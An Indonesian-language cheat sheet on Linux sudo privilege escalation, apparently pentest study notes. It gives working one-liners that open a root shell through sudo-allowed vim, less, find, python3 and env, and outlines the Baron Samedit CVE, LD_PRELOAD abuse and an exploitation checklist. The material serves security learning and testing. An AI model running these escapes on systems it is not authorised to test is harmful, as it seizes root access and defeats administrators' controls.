# 🔑 Exploiting Sudo (sudo Privilege Escalation)

> **Tujuan:** Memanfaatkan konfigurasi `sudo` yang longgar untuk menjalankan **shell sebagai root** melalui binary yang diizinkan.

---

## 📌 Penjelasan Singkat

`sudo` memungkinkan user menjalankan command dengan privilege user lain (biasanya **root**). Jika konfigurasi sudo memberikan akses ke binary tertentu tanpa batasan, binary tersebut dapat disalahgunakan untuk **privilege escalation**.

---

## 🛡️ Cek Hak Sudo

```bash
sudo -l
# Menampilkan daftar command yang boleh dijalankan via sudo
```

Perhatikan entry seperti:

```text
(root) NOPASSWD: /usr/bin/vim
(root) NOPASSWD: /usr/bin/python3
(root) NOPASSWD: /usr/bin/find
```

---

## 🧪 Cek GTFOBins

Untuk setiap binary yang diizinkan → cek di [https://gtfobins.github.io](https://gtfobins.github.io) bagian **Sudo** untuk melihat apakah binary tersebut memiliki teknik privilege escalation.

---

## 💥 Contoh Eksploitasi

```bash
sudo vim -c ':!/bin/sh'                            # vim
sudo less /etc/profile  -> !/bin/sh                 # less/more
sudo find . -exec /bin/sh \; -quit                 # find
sudo python3 -c 'import os;os.system("/bin/sh")'   # python3
sudo env /bin/sh                                   # env
```

| Binary | Metode | Catatan |
|--------|--------|---------|
| `vim` | `:!/bin/sh` | Command‑mode shell |
| `less`/`more` | `!command` | Pager shell escape |
| `find` | `-exec` | Executes arbitrary command |
| `python3` | `os.system` | Spawn shell via Python |
| `env` | `/bin/sh` | Runs shell via env utility |

> Sudo aman dari **dash‑drop** (ruid=euid=0 saat command benar‑benar dijalankan sebagai root).

---

## 🧨 Vektor Lain

### CVE‑2021‑3156 (Baron Samedit)

Heap‑based buffer overflow pada `sudoedit` yang memungkinkan **privilege escalation** pada versi rentan.

### LD_PRELOAD + env_keep

Jika `env_keep` mempertahankan `LD_PRELOAD`, attacker dapat memuat shared library berbahaya ketika program tertentu dijalankan via sudo.

```text
Defaults env_keep += "LD_PRELOAD"
```

Library berbahaya akan dieksekusi sebagai **root** saat sudo dijalankan.

---

## 🪜 Alur Eksploitasi

```text
sudo -l
   ↓
Identifikasi command yang diizinkan
   ↓
Cek binary di GTFOBins → Sudo
   ↓
Periksa versi & konfigurasi sudo
   ↓
Validasi permission
   ↓
Uji privilege escalation
   ↓
id → verifikasi root
```

---

## 📋 Checklist Sudo LPE

- [ ] Jalankan `sudo -l` untuk melihat hak sudo.
- [ ] Identifikasi setiap binary yang diizinkan.
- [ ] Cek [GTFOBins](https://gtfobins.github.io) → bagian **Sudo**.
- [ ] Cek versi sudo (apakah rentan CVE‑2021‑3156).
- [ ] Cek apakah `env_keep` mempertahankan `LD_PRELOAD` (jika ada).
- [ ] Uji payload pada binary yang relevan.
- [ ] Verifikasi dengan `id` → `uid=0(root)`.

---

## 📚 Referensi

- [GTFOBins – Sudo](https://gtfobins.github.io/)
- [Sudo Security Advisories (Baron Samedit)](https://www.sudo.ws/security/advisories/)
- [OWASP – Privilege Escalation Cheat Sheet](https://owasp.org/www-project-privilege-escalation-cheat-sheet)
